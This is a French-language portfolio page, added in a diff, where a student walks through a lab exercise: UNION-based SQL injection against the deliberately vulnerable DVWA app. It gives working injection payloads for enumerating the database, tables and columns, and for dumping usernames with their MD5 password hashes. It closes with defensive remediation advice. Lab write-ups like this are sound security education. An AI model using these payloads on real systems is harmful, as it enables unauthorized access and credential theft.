@@ -1,0 +1,181 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Injection SQL sur DVWA · Ylayann Malouda-Ribardiere</title>
+<meta name="description" content="Portfolio d'Ylayann Malouda-Ribardiere, étudiant BTS SIO SISR à Ynov Lille orienté GRC : projet SMSI ISO 27001 / EBIOS RM, certifications et write-ups CTF.">
+<meta name="theme-color" content="#0a0e14">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%230a0e14'/><text x='5' y='22' font-family='monospace' font-size='16' font-weight='700' fill='%2300e5a0'>&gt;_</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+
+<body>
+<header><div class="wrap"><nav>
+<a class="logo" href="../index.html#top">~/ylayann<span>$</span></a>
+<button class="burger" aria-label="Menu">menu</button>
+<ul><li><a href="../index.html#apropos">À propos</a></li><li><a href="../index.html#competences">Compétences</a></li><li><a href="../index.html#smsi">SMSI</a></li><li><a href="../index.html#ctf">Write-ups</a></li><li><a href="../index.html#contact">Contact</a></li></ul>
+</nav></div></header>
+
+<main class="article">
+<div class="crumbs"><a href="../index.html">~</a> / <a href="../index.html#ctf">write-ups</a> / sqli</div>
+<div class="head">
+<div class="chips"><span class="chip">web</span><span class="chip">sqli</span></div>
+<h1>Injection SQL sur DVWA (Cisco Ethical Hacker - Labo pratique)</h1>
+<div class="mono" style="color:var(--muted);font-size:.85rem">Cisco Ethical Hacker · Facile · 5 min de lecture · <a href="https://github.com/YlayannMR/ctf-writeups/tree/main/cisco/sql-injection" target="_blank" rel="noopener">source sur GitHub</a></div>
+</div>
+<p>Un des labos du parcours Cisco Ethical Hacker, sur DVWA cette fois,
+l'appli volontairement vulnérable la plus utilisée pour s'entraîner sur
+les bases de l'injection SQL. Ici on part d'un simple champ "User ID" et
+on va jusqu'à sortir les identifiants de tous les comptes.</p>
+<h2 id="le-contexte">Le contexte</h2>
+<p>DVWA propose un formulaire tout simple : un champ
+<code>User ID</code>, qui va chercher le prénom et le nom associés dans
+la base. Niveau Low, donc aucune protection, requête construite sans
+échappement ni requêtes préparées. La requête derrière ressemble
+typiquement à :</p>
+<pre class="sql"><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;</code></pre>
+<p>Dès qu'on voit un formulaire qui va piocher une info précise en
+fonction d'un ID, le réflexe c'est de tester si on peut casser la
+syntaxe de la requête.</p>
+<h2 id="étape-1--confirmer-linjection">Étape 1 : confirmer
+l'injection</h2>
+<p>Premier test basique pour vérifier que l'appli est vulnérable :</p>
+<pre class="sql"><code>&#39; OR 1=1 #</code></pre>
+<p>Ça casse la clause <code>WHERE</code> et retourne tous les
+utilisateurs d'un coup au lieu d'un seul. Confirmation immédiate :
+l'input n'est ni échappé ni filtré, l'injection est ouverte.</p>
+<p><img loading="lazy" src="../img/sqli/01-confirm-injection.png"
+alt="Confirmation de l&#39;injection" /></p>
+<h2 id="étape-2--trouver-le-bon-nombre-de-colonnes">Étape 2 : trouver le
+bon nombre de colonnes</h2>
+<p>Pour faire du UNION-based, il faut que le nombre de colonnes de mon
+<code>SELECT</code> corresponde exactement à celui de la requête
+d'origine. Ici la page affiche deux champs (prénom, nom), donc je pars
+sur deux colonnes :</p>
+<pre class="sql"><code>&#39; OR 1=1 UNION SELECT 1, VERSION() #</code></pre>
+<p>Ça passe sans erreur. Confirmation que deux colonnes suffisent, et au
+passage je récupère la version du serveur MySQL
+(<code>5.5.58-0+deb8u1</code> dans ce cas) directement affichée à la
+place du nom de famille.</p>
+<p><img loading="lazy" src="../img/sqli/02-union-version.png"
+alt="UNION avec VERSION()" /></p>
+<h2 id="étape-3--remonter-le-nom-de-la-base">Étape 3 : remonter le nom
+de la base</h2>
+<p>Une fois qu'on sait qu'on peut injecter du texte dans la deuxième
+colonne, autant en profiter pour cartographier l'environnement :</p>
+<pre class="sql"><code>&#39; OR 1=1 UNION SELECT 1, DATABASE() #</code></pre>
+<p>Résultat : <code>dvwa</code>. Je sais maintenant exactement dans
+quelle base je suis en train de fouiller.</p>
+<p><img loading="lazy" src="../img/sqli/03-database-name.png"
+alt="Nom de la base via DATABASE()" /></p>
+<h2 id="étape-4--lister-les-tables">Étape 4 : lister les tables</h2>
+<p><code>information_schema</code> est la base système présente sur tout
+MySQL, elle contient les métadonnées de toutes les autres bases :
+tables, colonnes, tout. C'est la cible logique pour cartographier ce
+qu'il y a à voler :</p>
+<pre class="sql"><code>&#39; OR 1=1 UNION SELECT 1, table_name FROM information_schema.tables 
+WHERE table_type=&#39;base table&#39; AND table_schema=DATABASE() #</code></pre>
+<p>Deux tables ressortent : <code>guestbook</code> et
+<code>users</code>. C'est évidemment <code>users</code> qui
+m'intéresse.</p>
+<p><img loading="lazy" src="../img/sqli/04-list-tables.png" alt="Liste des tables" /></p>
+<h2 id="étape-5--lister-les-colonnes-de-la-table-users">Étape 5 : lister
+les colonnes de la table users</h2>
+<p>Même logique, mais sur <code>information_schema.columns</code> cette
+fois, en ciblant précisément la table <code>users</code> :</p>
+<pre class="sql"><code>&#39; OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns 
+WHERE table_name=&#39;users&#39; #</code></pre>
+<p>Ça déroule les noms de colonnes un par un : <code>user_id</code>,
+<code>first_name</code>, <code>last_name</code>, <code>user</code>,
+<code>password</code>, <code>avatar</code>. Les deux qui comptent
+vraiment pour la suite sont évidemment <code>user</code> et
+<code>password</code>.</p>
+<p><img loading="lazy" src="../img/sqli/05-list-columns.png"
+alt="Liste des colonnes de users" /></p>
+<h2 id="étape-6--extraire-les-identifiants">Étape 6 : extraire les
+identifiants</h2>
+<p>Dernière étape, la plus directe : demander exactement les deux
+colonnes repérées à l'étape précédente.</p>
+<pre class="sql"><code>&#39; OR 1=1 UNION SELECT user, password FROM users #</code></pre>
+<p>Et là, tout tombe : la liste complète des comptes avec leurs hashs de
+mot de passe :</p>
+<pre><code>admin   : 5f4dcc3b5aa765d61d8327deb882cf99
+gordonb : e99a18c428cb38d5f260853678922e03
+1337    : 8d3533d75ae2c3966d7e0d4fcc69216b
+pablo   : 0d107d09f5bbe40cade3de5c71e9e9b7
+smithy  : 5f4dcc3b5aa765d61d8327deb882cf99</code></pre>
+<p><img loading="lazy" src="../img/sqli/06-dump-credentials.png"
+alt="Dump user / password" /></p>
+<p>Les hashs sont en MD5, reconnaissable à la longueur (32 caractères
+hexadécimaux) et clairement crackable en quelques secondes sur n'importe
+quel site de rainbow table ou avec hashcat en local.
+<code>5f4dcc3b5aa765d61d8327deb882cf99</code> par exemple, c'est le hash
+MD5 de <code>password</code>, un classique qui revient tout le temps sur
+ce genre de labo.</p>
+<h2 id="pourquoi-ça-marche">Pourquoi ça marche</h2>
+<p>Toute la chaîne repose sur le même problème de base : l'input
+utilisateur est concaténé directement dans la requête SQL, sans requête
+préparée ni échappement. Une fois qu'on a confirmé l'injection et le bon
+nombre de colonnes, <code>information_schema</code> devient une mine
+d'or qui permet de cartographier toute la base sans rien connaître à
+l'avance. Pas besoin de deviner les noms de tables ou de colonnes, la
+base les donne elle-même.</p>
+<h2 id="ce-que-je-retiens">Ce que je retiens</h2>
+<p>La méthodo UNION-based, c'est vraiment toujours le même enchaînement
+: confirmer l'injection, trouver le nombre de colonnes, identifier ce
+qui s'affiche à l'écran (pour savoir où placer mes données volées), puis
+remonter base → tables → colonnes → données via
+<code>information_schema</code>. Une fois cette logique en tête, le
+formulaire le plus anodin devient un point d'entrée vers toute la
+base.</p>
+<p>Le fait que les mots de passe soient en simple MD5 (sans salage) ici
+n'est pas un hasard non plus : c'est volontairement représentatif d'une
+mauvaise pratique encore trop fréquente en vrai : même si l'injection
+est corrigée un jour, un hash MD5 nu reste crackable en quelques
+secondes si jamais il fuite ailleurs.</p>
+<h2 id="comment-se-protéger">Comment se protéger</h2>
+<p>Si je devais corriger cette appli, la priorité absolue serait les
+<strong>requêtes préparées</strong>. C'est vraiment la seule protection
+qui règle le problème à la racine plutôt que de le contenir : l'input
+utilisateur n'est jamais concaténé dans la requête, il est passé à côté
+comme simple paramètre, donc peu importe ce que quelqu'un tape dedans,
+ça ne peut plus casser la syntaxe SQL.</p>
+<pre class="php"><code>// Vulnérable : concaténation directe
+$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&quot;;
+
+// Protégé : requête préparée
+$stmt = $pdo-&gt;prepare(&quot;SELECT first_name, last_name FROM users WHERE user_id = ?&quot;);
+$stmt-&gt;execute([$id]);</code></pre>
+<p>Après ça, tout le reste vient en soutien, jamais en remplacement
+:</p>
+<ul>
+<li><strong>Principe du moindre privilège</strong> : le compte MySQL de
+l'appli ne devrait avoir accès qu'au strict nécessaire. S'il ne peut pas
+lire <code>information_schema</code> en profondeur ni sortir de son
+périmètre de tables, une injection qui passerait quand même rapporterait
+beaucoup moins.</li>
+<li><strong>Typer les entrées</strong> : un <code>user_id</code> censé
+être un entier devrait l'être avant même d'atteindre la requête (ça
+ferme une partie des tentatives basiques, sans remplacer les prepared
+statements).</li>
+<li><strong>Ne pas exposer les erreurs SQL</strong> : message générique
+côté utilisateur, vrais logs côté serveur. Autant ne pas donner
+gratuitement des indices sur la structure de la base.</li>
+<li><strong>Hasher correctement les mots de passe</strong> : bcrypt,
+scrypt ou argon2 (avec sel et facteur de coût), pas du MD5 nu.</li>
+<li><strong>WAF</strong> : utile comme filet de sécurité, jamais comme
+seule protection. La vraie défense reste dans le code.</li>
+</ul>
+<hr />
+<p><em>Outils : navigateur uniquement, formulaire DVWA en Low Security,
+aucun outil d'automatisation nécessaire pour ce niveau.</em></p>
+
+<div class="nextprev"><span></span><a class="btn" href="idor.html">IDOR sur BluePortal →</a></div>
+</main>
+<footer><div class="wrap"><span class="mono">© 2026 Ylayann Malouda-Ribardiere</span><span><a href="https://github.com/YlayannMR" target="_blank" rel="noopener">GitHub</a> · <a href="https://www.linkedin.com/in/ylayann-malouda-ribardiere-3a1a89360/" target="_blank" rel="noopener">LinkedIn</a></span></div></footer>
+<script src="../assets/main.js"></script>
+</body>
+</html>
